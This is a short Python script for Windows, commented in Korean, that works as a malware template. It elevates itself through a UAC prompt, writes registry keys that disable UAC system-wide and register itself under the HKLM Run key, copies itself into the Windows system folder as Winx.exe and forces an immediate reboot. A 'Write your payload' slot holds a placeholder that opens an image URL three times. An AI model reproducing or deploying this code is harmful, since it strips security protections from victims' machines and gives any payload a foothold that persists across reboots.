

import os
import sys

# win32com.shell이 아닌 win32comext 이다
import webbrowser
from shutil import copyfile

from win32comext.shell import shell
ASADMIN = 'asadmin'
PROG_NAME ='Winx.exe'
ROOT_PATH = os.environ['SystemRoot']


if __name__ == '__main__':
    if sys.argv[-1] != ASADMIN:
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
        shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
        sys.exit()

    if os.path.isdir(os.path.join(ROOT_PATH,'Winx')) is False:
        # root 파일을 레지스트리에 등록
        try:
            os.mkdir(os.path.join(ROOT_PATH,'Winx'))
            os.system('reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')
            os.system(f'reg.exe ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /f /v Winx /t REG_SZ /d "{ROOT_PATH}\\{PROG_NAME}"')
            os.system('shutdown /r /f /t 1')
            os.system(os.path.join(ROOT_PATH,PROG_NAME))
            copyfile(sys.argv[0], os.path.join(ROOT_PATH, PROG_NAME))
        except FileExistsError:
            pass
        sys.exit()
    # Write your payload
    webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')
    webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')
    webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')